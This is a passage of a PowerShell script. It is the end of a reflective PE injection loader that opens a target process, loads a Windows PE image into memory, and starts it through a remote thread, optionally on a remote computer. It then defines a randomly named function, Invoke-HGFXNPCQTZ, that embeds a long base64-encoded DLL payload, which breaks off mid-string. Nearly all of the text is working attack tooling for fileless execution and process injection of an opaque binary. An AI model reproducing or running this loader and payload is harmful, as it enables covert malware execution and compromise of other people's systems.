				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}

				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}

				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}


		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null


		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants

		$RemoteProcHandle = [IntPtr]::Zero


		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}









		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}

			Write-Verbose "Got the handle for the remote process to inject in to"
		}



		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}

		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1]



		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{



	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {

				    }
					else
					{
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
					}
	            }
	        }



		}

		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{

			}
			else{
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle


			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
			}
		}



		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{

		}
		else
		{






		}

		Write-Verbose "Done!"
	}

	Main
}


Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}

	Write-Verbose "PowerShell ProcessID: $PID"


	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {


		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}


	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}

function Invoke-HGFXNPCQTZ
{

$PEBytes32 = "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/zP/jUXsx4X0/v//QhEAEImF+P7//0eNRejHhQD///8jEQAQiYUE////jUXkiYUQ////jUXgiYUc////jUXIiYUo////jUXAiYU0////jUXcagVZiYVA////jUXYagJaiYVM////jUXUiY3w/v//iY38/v//iY0I////x4UM////0REAEMeFFP///wYAAADHhRj///8ZEAAQib0g////x4Uk////hhIAEImVLP///8eFMP///yATABDHhTj///8GAAAAx4U8////UhMAEImVRP///8eFSP///58RABCJjVD////HhVT///8sEAAQiYVY////jUWox4Vg////sRAAEImFZP///41FoImFcP///41F0GoGWomFfP///41FuIlFiI2F7P7//2oOUFaJlVz///+JjWj////HhWz////EEAAQiY10////x4V4////BBEAEIlNgMdFhHEQABCJVYzHRZBeEAAQ6LI+AAD/dbSL8I2FyP7//1DoGpkAAFPodyQAAIPEQIX2dQczwOlRAgAA6NcJAACjFNcBELtAwAEQjUXwUGoIagZoVgIAAFPo3zUAADPAZolF+I1FlFBqCGoIaF0HAABT6MY1AAAzwGaJRZyNheD+//9QagpqDWgMAQAAU+iqNQAAM8BQaiBoANYBEGaJher+///o8TQAAIPESKMM1wEQ6NIpAACjENcBEIXAdQ+NRfBQ6Ck5AABZoxDXARDozgIAAKMI1wEQ6OgqAACjGNcBEIXAdQ+NRfBQ6AI5AABZoxjXARDoPSYAAKMc1wEQhcB1D41F8FDo5TgAAFmjHNcBEOiGJwAAoyDXARCFwHUPjUXwUOjIOAAAWaMg1wEQ6IUoAACjJNcBEIXAdQ+NRfBQ6Ks4AABZoyTXARDogysAAIXAjZXg/v//jU2UD0TKUeiMOAAAWaMo1wEQ6N8pAACjLNcBEIXAdQ+NRfBQ6G84AABZoyzXARCNRbBQ6OUlAABrTbAWi/BqAFFW6PozAABWozDXARDo+iIAAOj0KwAA99gbwIPg6oPAVqOA1wEQ6N4GAADowwcAAOinBAAAjYW4/v//UGoMag5o9AYAAFPoWTQAADPAZomFxP7//42FuP7//1Dojfn//4PELPfYG8BAo5jXARDo8gUAAIM9DNcBEAB0dYM9ENcBEAB0bIM9FNcBEAB0Y4M9CNcBEAB0WoM9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